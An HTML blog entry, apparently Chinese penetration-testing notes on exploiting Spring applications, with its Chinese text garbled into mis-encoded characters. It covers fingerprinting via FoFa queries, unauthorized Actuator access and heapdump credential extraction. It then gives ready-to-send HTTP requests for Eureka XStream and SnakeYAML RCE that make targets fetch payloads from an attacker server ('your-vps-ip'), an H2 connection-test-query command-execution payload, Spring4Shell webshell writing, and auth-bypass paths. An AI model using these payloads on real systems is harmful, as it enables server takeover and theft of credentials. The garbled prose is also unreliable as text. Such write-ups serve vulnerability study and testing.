        <content type="html"><![CDATA[<h2 id="Springæ¦‚è¿°"><a href="#Springæ¦‚è¿°" class="headerlink" title="Springæ¦‚è¿°"></a>Springæ¦‚è¿°</h2><p>Spring Framework æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨ç¨‹åºæ¡†æ¶å’Œ Java å¹³å°çš„æ§åˆ¶å®¹å™¨çš„åè½¬ã€‚ç”±äºå…¶å¼ºå¤§çš„åŠŸèƒ½å’Œæ˜“ç”¨æ€§ï¼Œå®ƒåœ¨è¡Œä¸šä¸­è¢«å„ç§ç¨‹åºå’Œç³»ç»Ÿå¹¿æ³›ä½¿ç”¨ã€‚ä¸€äº›çŸ¥åäº§å“å¦‚ Spring Boot å’Œ Spring Cloud éƒ½æ˜¯ä½¿ç”¨ Spring Framework å¼€å‘çš„ã€‚</p><h2 id="æ¡†æ¶ç‰¹å¾"><a href="#æ¡†æ¶ç‰¹å¾" class="headerlink" title="æ¡†æ¶ç‰¹å¾"></a>æ¡†æ¶ç‰¹å¾</h2><ul><li><p>å¦‚æœ Web åº”ç”¨ç¨‹åºçš„ favicon.ico å›¾æ ‡é»˜è®¤æ²¡æœ‰æ›´æ”¹ï¼Œæ˜¯ä¸€ä¸ªå°ç»¿å¶<br><img src="/../images/image-20230622113805635.png" alt="image-20230622113805635"></p><p>FoFaè¯­æ³•</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;116323821&quot;</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœ web åº”ç”¨å¼€å‘è€…æ²¡æœ‰ä¿®æ”¹ SpringBoot Web åº”ç”¨çš„é»˜è®¤ 4xxã€5xx æŠ¥é”™é¡µé¢ï¼Œé‚£ä¹ˆå½“ web åº”ç”¨ç¨‹åºå‡ºç° 4xxã€5xx é”™è¯¯æ—¶ï¼Œä¼šæŠ¥é”™å¦‚ä¸‹å›¾ï¼š</p><p><img src="/../images/image-20230622113724212.png" alt="image-20230622113724212"></p><p>FoFaè¯­æ³•</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">body=&quot;Whitelabel Error Page&quot;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Spring-Boot-Actuatoræœªæˆæƒè®¿é—®"><a href="#Spring-Boot-Actuatoræœªæˆæƒè®¿é—®" class="headerlink" title="Spring Boot Actuatoræœªæˆæƒè®¿é—®"></a>Spring Boot Actuatoræœªæˆæƒè®¿é—®</h2><h3 id="Actuatoræ¦‚è¿°"><a href="#Actuatoræ¦‚è¿°" class="headerlink" title="Actuatoræ¦‚è¿°"></a>Actuatoræ¦‚è¿°</h3><p>â€‹Actuator æ˜¯ springboot æä¾›çš„ç”¨æ¥å¯¹åº”ç”¨ç³»ç»Ÿè¿›è¡Œè‡ªçœå’Œç›‘æ§çš„åŠŸèƒ½æ¨¡å—ï¼Œå€ŸåŠ©äº Actuator å¼€å‘è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¯¹åº”ç”¨ç³»ç»ŸæŸäº›ç›‘æ§æŒ‡æ ‡è¿›è¡ŒæŸ¥çœ‹ã€ç»Ÿè®¡ç­‰ã€‚åœ¨ Actuator å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšå¥½ç›¸å…³æƒé™æ§åˆ¶ï¼Œéæ³•ç”¨æˆ·å¯é€šè¿‡è®¿é—®é»˜è®¤çš„æ‰§è¡Œå™¨ç«¯ç‚¹ï¼ˆendpointsï¼‰æ¥è·å–åº”ç”¨ç³»ç»Ÿä¸­çš„ç›‘æ§ä¿¡æ¯ï¼Œä»è€Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ç”šè‡³æœåŠ¡å™¨è¢«æ¥ç®¡çš„äº‹ä»¶å‘ç”Ÿã€‚</p><p>â€‹å…¶æä¾›çš„æ‰§è¡Œå™¨ç«¯ç‚¹åˆ†ä¸ºä¸¤ç±»ï¼šåŸç”Ÿç«¯ç‚¹å’Œç”¨æˆ·è‡ªå®šä¹‰æ‰©å±•ç«¯ç‚¹ï¼ŒåŸç”Ÿç«¯ç‚¹ä¸»è¦æœ‰ï¼š</p><p><img src="/../images/v2-2b1d2a3a0ce2ec85a29c4c2fcc81459c.jpg" alt="v2-2b1d2a3a0ce2ec85a29c4c2fcc81459c.jpg"></p><h4 id="ç‰ˆæœ¬é—®é¢˜"><a href="#ç‰ˆæœ¬é—®é¢˜" class="headerlink" title="ç‰ˆæœ¬é—®é¢˜"></a>ç‰ˆæœ¬é—®é¢˜</h4><ul><li><p><code>Spring Boot</code> &lt; 1.5ï¼šé»˜è®¤æœªæˆæƒè®¿é—®æ‰€æœ‰ç«¯ç‚¹ã€</p></li><li><p><code>Spring Boot</code> &gt;&#x3D; 1.5ï¼šé»˜è®¤åªå…è®¸è®¿é—® <code>/health</code> å’Œ <code>/info</code> ç«¯ç‚¹ï¼Œä½†æ˜¯æ­¤å®‰å…¨æ€§é€šå¸¸è¢«åº”ç”¨ç¨‹åºå¼€å‘äººå‘˜ç¦ç”¨äº†</p></li><li><p><code>Spring Boot</code>2.xç›¸æ¯”äº1.xç‰ˆæœ¬çš„ç«¯ç‚¹å¤šäº†ä¸ªå‰ç¼€ <code>/actuator</code>ï¼Œå¦‚<code>/health</code> å˜æˆäº†<code>/actuator/health</code>ã€‚</p></li></ul><h4 id="ç«¯ç‚¹è·¯å¾„"><a href="#ç«¯ç‚¹è·¯å¾„" class="headerlink" title="ç«¯ç‚¹è·¯å¾„"></a>ç«¯ç‚¹è·¯å¾„</h4><p>è®¾ç½®ç®¡ç†ç«¯ç‚¹çš„è·¯å¾„:</p><p>åœ¨1.xç‰ˆæœ¬ä¸‹ï¼Œè®¾ç½®è¯­å¥å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.context-path =/manage</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ç«¯ç‚¹çš„è®¿é—®æ–¹å¼å°±å˜ä¸ºäº†:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/manage/dump</span><br><span class="line">/manage/autoconfig</span><br><span class="line">/manage/metrics</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>åœ¨2.xç‰ˆæœ¬ï¼Œè®¾ç½®è¯­å¥å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.endpoints.web.base-path=/manage</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ç«¯ç‚¹çš„è®¿é—®æ–¹å¼å°±å˜ä¸ºäº†:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /actuatorè¢«manageä»£æ›¿</span><br><span class="line"></span><br><span class="line">/manage/dump</span><br><span class="line">/manage/autoconfig</span><br><span class="line">/manage/metrics</span><br><span class="line">...</span><br></pre></td></tr></table></figure><blockquote><p>æœ‰äº›äººå¯èƒ½å–œæ¬¢å°†å…¶å‘½åä¸º<code>monitor</code>,æ‰€ä»¥çŸ¥é“è¿™ä¸ªç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥é€‚å½“ä¸°å¯Œä¸‹è‡ªå·±çš„å­—å…¸ã€‚</p></blockquote><h3 id="Actuatorç«¯ç‚¹åˆ©ç”¨"><a href="#Actuatorç«¯ç‚¹åˆ©ç”¨" class="headerlink" title="Actuatorç«¯ç‚¹åˆ©ç”¨"></a>Actuatorç«¯ç‚¹åˆ©ç”¨</h3><h4 id="x2F-mappings"><a href="#x2F-mappings" class="headerlink" title="&#x2F;mappings"></a>&#x2F;mappings</h4><p>æ³„éœ²è·¯ç”±ä¿¡æ¯</p><p><img src="/../images/image-20230623215633942.png" alt="image-20230623215633942"></p><h4 id="x2F-traceï¼Œ-x2F-httptrace"><a href="#x2F-traceï¼Œ-x2F-httptrace" class="headerlink" title="&#x2F;traceï¼Œ&#x2F;httptrace"></a>&#x2F;traceï¼Œ&#x2F;httptrace</h4><ul><li><p>è·å–åŸºæœ¬çš„ HTTP è¯·æ±‚è·Ÿè¸ªä¿¡æ¯ï¼ˆæ—¶é—´æˆ³ã€HTTP å¤´ç­‰ï¼‰</p></li><li><p>å­˜åœ¨çš„éšæ‚£ï¼šå¦‚æœå­˜åœ¨ç™»å½•ç”¨æˆ·çš„æ“ä½œè¯·æ±‚ï¼Œå¯ä»¥çªƒå–ç”¨æˆ·å‡­è¯ã€‚</p></li></ul><p><img src="/../images/image-20230623215702605.png" alt="image-20230623215702605"></p><p><strong>æ³¨æ„ï¼šè¿™ä¸ªåªæ˜¯æ˜¾ç¤ºæœ€è¿‘çš„100æ¡æ•°æ®ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å†™è„šæœ¬æ¥æŒç»­ç›‘æ§ã€‚</strong></p><h4 id="x2F-env"><a href="#x2F-env" class="headerlink" title="&#x2F;env"></a>&#x2F;env</h4><ul><li><p>è·å–å…¨éƒ¨ç¯å¢ƒå±æ€§</p></li><li><p>å­˜åœ¨çš„éšæ‚£</p><ul><li><p>å¯èƒ½ä¼šæ³„éœ²æ•°æ®åº“è´¦å·å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯,ä½†æ˜¯æ³„éœ²çš„å¯†ç ä¼šç”¨æ˜Ÿå·è¿›è¡Œè„±æ•ï¼Œæƒ³è¦è·å–ç›¸åº”çš„æ˜æ–‡å¯†ç ï¼Œå¯ä»¥å°è¯•é€šè¿‡åˆ†æheapdumpæ•°æ®çš„æ–¹å¼</p></li><li><p>Spring eureka xstream  RCE</p></li></ul></li></ul><h4 id="x2F-heapdump"><a href="#x2F-heapdump" class="headerlink" title="&#x2F;heapdump"></a>&#x2F;heapdump</h4><blockquote><p>Heap Dumpä¹Ÿå«å †è½¬å‚¨æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªJavaè¿›ç¨‹åœ¨æŸä¸ªæ—¶é—´ç‚¹ä¸Šçš„å†…å­˜å¿«ç…§<br>Heap Dumpæ˜¯æœ‰ç€å¤šç§ç±»å‹çš„ï¼Œä¸è¿‡æ€»ä½“ä¸Šheap dumpåœ¨è§¦å‘å¿«ç…§çš„æ—¶å€™éƒ½ä¿å­˜äº†javaå¯¹è±¡å’Œç±»çš„ä¿¡æ¯<br>é€šå¸¸åœ¨å†™heap dumpæ–‡ä»¶å‰ä¼šè§¦å‘ä¸€æ¬¡FullGCï¼Œæ‰€ä»¥heap dumpæ–‡ä»¶ä¸­ä¿å­˜çš„æ˜¯FullGCåç•™ä¸‹çš„å¯¹è±¡ä¿¡æ¯ã€‚å…¶ä¸­å¯èƒ½ä¼šå«æœ‰æ•æ„Ÿæ•°æ®ï¼Œå¦‚æ•°æ®åº“çš„å¯†ç æ˜æ–‡,accesskeyç­‰</p></blockquote><p>è®¿é—®åä¼šä¸‹è½½heapdump</p><p><img src="/../images/image-20230623215844567.png" alt="image-20230623215844567"></p><h5 id="heapdumpåˆ†æå·¥å…·"><a href="#heapdumpåˆ†æå·¥å…·" class="headerlink" title="heapdumpåˆ†æå·¥å…·"></a>heapdumpåˆ†æå·¥å…·</h5><ul><li><p><a href="https://github.com/wyzxxz/heapdump_tool">wyzxxz&#x2F;heapdump_tool: heapdumpæ•æ„Ÿä¿¡æ¯æŸ¥è¯¢å·¥å…·ï¼Œä¾‹å¦‚æŸ¥æ‰¾ spring heapdumpä¸­çš„å¯†ç æ˜æ–‡ï¼ŒAK,SKç­‰</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸºäºJAVAè‡ªå¸¦çš„jhatï¼Œé€šè¿‡jhatè§£æheapdumpæ–‡ä»¶</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230711221037329.png" alt="image-20230711221037329"></p></li><li><p><a href="https://github.com/whwlsfb/JDumpSpider">JDumpSpider</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar .\JDumpSpider-1.1-SNAPSHOT-full.jar .\heapdump</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230622152614844.png" alt="image-20230622152614844"></p><p><img src="/../images/image-20230622152600035.png" alt="image-20230622152600035"></p></li></ul><h2 id="Spring-eureka-xstream-RCE"><a href="#Spring-eureka-xstream-RCE" class="headerlink" title="Spring eureka xstream  RCE"></a><strong>Spring eureka xstream  RCE</strong></h2><h5 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><ul><li>å¯ä»¥ POST è¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ <code>/env</code> æ¥å£è®¾ç½®å±æ€§</li><li>å¯ä»¥ POST è¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ <code>/refresh</code> æ¥å£åˆ·æ–°é…ç½®ï¼ˆå­˜åœ¨ <code>spring-boot-starter-actuator</code> ä¾èµ–ï¼‰</li><li>ç›®æ ‡ä½¿ç”¨çš„ <code>eureka-client</code> &lt; 1.8.7ï¼ˆé€šå¸¸åŒ…å«åœ¨ <code>spring-cloud-starter-netflix-eureka-client</code> ä¾èµ–ä¸­ï¼‰</li><li>ç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„ HTTP æœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰</li></ul><p><img src="/../images/image-20230711220504085.png" alt="image-20230711220504085"></p><h5 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h5><p>ä¿®æ”¹è¦æ‰§è¡Œçš„å‘½ä»¤å</p><p><img src="/../images/image-20230623213306180.png" alt="image-20230623213306180"></p><p>èµ·ä¸€ä¸ªæ¶æ„eureka server </p><p><img src="/../images/image-20230623213230483.png" alt="image-20230623213230483"></p><p>è®¾ç½®eureka.client.serviceUrl.defaultZone å±æ€§ä¸ºæ¶æ„çš„å¤–éƒ¨ eureka server URL åœ°å€</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># spring 1.x</span><br><span class="line">POST /env</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</span><br><span class="line"></span><br><span class="line"># spring 2.x</span><br><span class="line">POST /actuator/env</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line">    </span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623213048736.png" alt="image-20230623213048736"></p><p> refresh è§¦å‘ç›®æ ‡æœºå™¨è¯·æ±‚è¿œç¨‹ URLï¼Œæå‰æ¶è®¾çš„  eureka server å°±ä¼šè¿”å›æ¶æ„çš„ payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># spring 1.x</span><br><span class="line"></span><br><span class="line">POST /refresh</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded  </span><br><span class="line"></span><br><span class="line"># spring 2.x</span><br><span class="line">POST /actuator/refresh</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623212943456.png" alt="image-20230623212943456"></p><p>ä»è€Œè§¦å‘ XStream ååºåˆ—åŒ–ï¼Œé€ æˆ RCE æ¼æ´</p><p><img src="/../images/image-20230623212922680.png" alt="image-20230623212922680"></p><p>æ‰§è¡Œå®Œå‘½ä»¤åè®°å¾—æ¢å¤ï¼Œå¦‚æœä¸æ¢å¤çš„è¯ï¼Œé‚£ä¹ˆå‘½ä»¤å°±ä¼šä¸€ç›´æ‰§è¡Œï¼Œç³»ç»Ÿä¹Ÿä¼šä¸€ç›´æŠ¥é”™ï¼Œå°†eureka.client.serviceUrl.defaultZoneå±æ€§è®¾ç½®ä¸ºåŸæ¥çš„å³å¯ã€‚</p><p>â€‹    </p><h2 id="Spring-cloud-SnakeYAML-RCE"><a href="#Spring-cloud-SnakeYAML-RCE" class="headerlink" title="Spring cloud SnakeYAML RCE"></a>Spring cloud SnakeYAML RCE</h2><h3 id="ç‰ˆæœ¬å½±å“"><a href="#ç‰ˆæœ¬å½±å“" class="headerlink" title="ç‰ˆæœ¬å½±å“"></a>ç‰ˆæœ¬å½±å“</h3><p>ç›®æ ‡ä¾èµ–çš„ <code>spring-cloud-starter</code> ç‰ˆæœ¬ &lt; 1.3.0</p><h3 id="å¤ç°-1"><a href="#å¤ç°-1" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>æœ¬åœ°ç”Ÿæˆyaml-payloadçš„jaråŒ…,å‘½ä»¤ä¸º</p><p><img src="/../images/image-20230623221559474.png" alt="image-20230623221559474"></p><p>ç”Ÿæˆåˆ©ç”¨è¯¥jaråŒ…çš„example.ymlæ–‡ä»¶</p><p><img src="/../images/image-20230623221123809.png" alt="image-20230623221123809"></p><p>æŒ‚è½½æœåŠ¡</p><p><img src="/../images/image-20230623221249623.png" alt="image-20230623221249623"></p><p>è®¾ç½®spring.cloud.bootstrap.location å±æ€§ä¸ºå¤–éƒ¨æ¶æ„ yml æ–‡ä»¶ URL åœ°å€</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring 1.x</span></span><br><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http:<span class="comment">//your-vps-ip/example.yml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># spring 2.x</span></span><br><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;eureka.client.serviceUrl.defaultZone&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;http://your-vps-ip/example.yml&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623220715323.png" alt="image-20230623220715323"></p><p>refresh è§¦å‘ç›®æ ‡æœºå™¨è¯·æ±‚è¿œç¨‹ HTTP æœåŠ¡å™¨ä¸Šçš„ yml æ–‡ä»¶ï¼Œè·å¾—å…¶å†…å®¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring 1.x</span></span><br><span class="line"></span><br><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># spring 2.x</span></span><br><span class="line"></span><br><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623220901991.png" alt="image-20230623220901991"></p><p>SnakeYAML ç”±äºå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ‰€ä»¥è§£ææ¶æ„ yml å†…å®¹æ—¶ä¼šå®ŒæˆæŒ‡å®šçš„åŠ¨ä½œ,å…ˆæ˜¯è§¦å‘ java.net.URL å»æ‹‰å–è¿œç¨‹ HTTP æœåŠ¡å™¨ä¸Šçš„æ¶æ„ jar æ–‡ä»¶,ç„¶åæ˜¯å¯»æ‰¾ jar æ–‡ä»¶ä¸­å®ç° javax.script.ScriptEngineFactory æ¥å£çš„ç±»å¹¶å®ä¾‹åŒ–,å®ä¾‹åŒ–ç±»æ—¶æ‰§è¡Œæ¶æ„ä»£ç ï¼Œé€ æˆ RCE æ¼æ´</p><p><img src="/../images/image-20230623220853189.png" alt="image-20230623220853189"></p><h3 id="æ³¨å…¥å†…å­˜é©¬"><a href="#æ³¨å…¥å†…å­˜é©¬" class="headerlink" title="æ³¨å…¥å†…å­˜é©¬"></a>æ³¨å…¥å†…å­˜é©¬</h3><p><img src="/../images/image-20230623222557267.png" alt="image-20230623222557267"></p><h2 id="Spring-restart-h2-database-query-RCE"><a href="#Spring-restart-h2-database-query-RCE" class="headerlink" title="Spring restart h2 database query RCE"></a>Spring restart h2 database query RCE</h2><h3 id="ç‰ˆæœ¬å½±å“-1"><a href="#ç‰ˆæœ¬å½±å“-1" class="headerlink" title="ç‰ˆæœ¬å½±å“"></a>ç‰ˆæœ¬å½±å“</h3><p>å­˜åœ¨ <code>com.h2database.h2</code> ä¾èµ–ï¼ˆç‰ˆæœ¬è¦æ±‚æš‚æœªçŸ¥ï¼‰</p><h3 id="å¤ç°-2"><a href="#å¤ç°-2" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>hackbaréœ€è¦å°†åŸæœ¬çš„content-typeåˆ é™¤ï¼Œç„¶åé€‰æ‹©application&#x2F;jsonæ‰å¯ä»¥å‘é€Content-Type: application&#x2F;jsonçš„è¯·æ±‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;spring.datasource.hikari.connection-test-query&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;);&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623233147055.png" alt="image-20230623233147055"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623233543854.png" alt="image-20230623233543854"></p><p><img src="/../images/image-20230623233529452.png" alt="image-20230623233529452"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯payload ä¸­çš„ â€˜T5â€™ æ–¹æ³•æ¯ä¸€æ¬¡æ‰§è¡Œå‘½ä»¤åéƒ½éœ€è¦æ›´æ¢åç§° (å¦‚ T6) ï¼Œç„¶åæ‰èƒ½è¢«é‡æ–°åˆ›å»ºä½¿ç”¨ï¼Œå¦åˆ™ä¸‹æ¬¡ restart é‡å¯åº”ç”¨æ—¶æ¼æ´ä¸ä¼šè¢«è§¦å‘</p><p><img src="/../images/image-20230623233701077.png" alt="image-20230623233701077"></p><h2 id="Spring-Cloud-Gateway-SPEL-RCE"><a href="#Spring-Cloud-Gateway-SPEL-RCE" class="headerlink" title="Spring Cloud Gateway SPEL RCE"></a>Spring Cloud Gateway SPEL RCE</h2><p>Spring Cloud Gatewayæ˜¯Springä¸­çš„ä¸€ä¸ªAPIç½‘å…³ã€‚å­˜åœ¨SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œ<strong>å½“æ”»å‡»è€…å¯ä»¥è®¿é—®Actuator APIçš„æƒ…å†µä¸‹</strong>ï¼Œå°†å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><h3 id="ç‰ˆæœ¬å½±å“-2"><a href="#ç‰ˆæœ¬å½±å“-2" class="headerlink" title="ç‰ˆæœ¬å½±å“"></a>ç‰ˆæœ¬å½±å“</h3><ul><li>Spring Cloud Gateway<ul><li>3.1.0</li><li>3.0.0 to 3.0.6</li><li>Older, unsupported versions are also affected</li></ul></li></ul><h3 id="å¤ç°-3"><a href="#å¤ç°-3" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ·»åŠ ä¸€ä¸ªåŒ…å«æ¶æ„SpELè¡¨è¾¾å¼çš„è·¯ç”±/actuator/gateway/routes/hacktest</span><br><span class="line">åº”ç”¨åˆšæ·»åŠ çš„è·¯ç”±/actuator/gateway/refresh</span><br><span class="line">è®¿é—®æ¶æ„è·¯ç”±å¾—åˆ°ç»“æœ/actuator/gateway/routes/hacktest</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230622121048903.png" alt="image-20230622121048903"></p><p><img src="/../images/image-20230622121110774.png" alt="image-20230622121110774"></p><h2 id="Cloud-Function-SPEL-RCE"><a href="#Cloud-Function-SPEL-RCE" class="headerlink" title="Cloud Function  SPEL RCE"></a>Cloud Function  SPEL RCE</h2><p>Spring Cloud Function æ˜¯Spring cloudä¸­çš„serverlessæ¡†æ¶ã€‚</p><p>Spring Cloud Function ä¸­çš„ RoutingFunction ç±»çš„ apply æ–¹æ³•å°†è¯·æ±‚å¤´ä¸­çš„â€œspring.cloud.function.routing-expressionâ€å‚æ•°ä½œä¸º Spel è¡¨è¾¾å¼è¿›è¡Œå¤„ç†ï¼Œé€ æˆ Spel è¡¨è¾¾å¼æ³¨å…¥æ¼æ´ã€‚</p><p>æ”»å‡»è€…å¯é€šè¿‡è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h3 id="ç‰ˆæœ¬å½±å“-3"><a href="#ç‰ˆæœ¬å½±å“-3" class="headerlink" title="ç‰ˆæœ¬å½±å“"></a>ç‰ˆæœ¬å½±å“</h3><p>org.springframework.cloud:spring-cloud-function-contextï¼ˆå½±å“ç‰ˆæœ¬ï¼š3.0.0.RELEASE~3.2.2ï¼‰</p><h3 id="å¤ç°-4"><a href="#å¤ç°-4" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>acceptéœ€è¦ä¿®æ”¹</p><p><img src="/../images/image-20230622130314936.png"></p><p><img src="/../images/image-20230622130328296.png" alt="image-20230622130328296"></p><h2 id="spring-core-rce"><a href="#spring-core-rce" class="headerlink" title="spring-core-rce"></a>spring-core-rce</h2><h3 id="ç‰ˆæœ¬å½±å“-4"><a href="#ç‰ˆæœ¬å½±å“-4" class="headerlink" title="ç‰ˆæœ¬å½±å“"></a>ç‰ˆæœ¬å½±å“</h3><p>ä½¿ç”¨JDK9åŠä»¥ä¸Šç‰ˆæœ¬çš„Spring MVCæ¡†æ¶<br>spring-webmvc æˆ– spring-webfluxä¾èµ–<br>spring framework 5.3.0-5.3.17ã€5.2.0-5.2.19ç‰ˆæœ¬ï¼Œä»¥åŠæ›´æ—©çš„ç‰ˆæœ¬</p><h3 id="å¤ç°-5"><a href="#å¤ç°-5" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>è¿™é‡Œç¯å¢ƒç”¨vulfocusçš„ï¼Œvulhubçš„ä¸çŸ¥é“ä¸ºå•¥ä¸è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus/spring-core-rce-2022-03-29</span><br><span class="line">docker run -d -p 8090:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29</span><br></pre></td></tr></table></figure><p>æ”»å‡»åŸç†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡ä¿®æ”¹Tomcatçš„æ—¥å¿—è·¯å¾„ä¸åç¼€å†™å…¥jspæœ¨é©¬</span><br></pre></td></tr></table></figure><p>è„šæœ¬ï¼š<a href="https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE">https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE</a></p><p><img src="/../images/image-20230622144319219.png" alt="image-20230622144319219"></p><p><img src="/../images/image-20230622144248672.png" alt="image-20230622144248672"></p><p><img src="/../images/image-20230622143115129.png" alt="image-20230622143115129"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯æ¯æ¬¡å‘webhsellè¯·æ±‚æ—¶éƒ½ä¼šå†æ¬¡å‘å…¶å†™å…¥æœ¨é©¬å†…å®¹</p><p><img src="/../images/image-20230622143518694.png" alt="image-20230622143518694"></p><p>å¯ä»¥é€šè¿‡ä»¥ä¸‹è¯·æ±‚è¿›è¡Œæ¸…é™¤</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=</span><br></pre></td></tr></table></figure><p>æ€»ä½“æ¥è¯´ï¼Œè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ–¹æ³•ä¼šä¿®æ”¹ç›®æ ‡æœåŠ¡å™¨é…ç½®ï¼Œå¯¼è‡´ç›®æ ‡éœ€è¦é‡å¯æœåŠ¡å™¨æ‰èƒ½æ¢å¤ï¼Œå®é™…æµ‹è¯•ä¸­éœ€è¦æ ¼å¤–æ³¨æ„ã€‚</p><h2 id="æƒé™ç»•è¿‡"><a href="#æƒé™ç»•è¿‡" class="headerlink" title="æƒé™ç»•è¿‡"></a>æƒé™ç»•è¿‡</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/%0a</span><br><span class="line">/admin/%0d</span><br><span class="line"></span><br><span class="line"># CVE-2023-20860</span><br><span class="line">/admin/** </span><br></pre></td></tr></table></figure><h3 id="å¤ç°-6"><a href="#å¤ç°-6" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p><img src="/../images/image-20230622145009253.png" alt="image-20230622145009253"></p><p><img src="/../images/image-20230622145034999.png" alt="image-20230622145034999"></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://github.com/LandGrey/SpringBootVulExploit#%E4%B8%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">LandGrey&#x2F;SpringBootVulExploit: SpringBoot ç›¸å…³æ¼æ´å­¦ä¹ 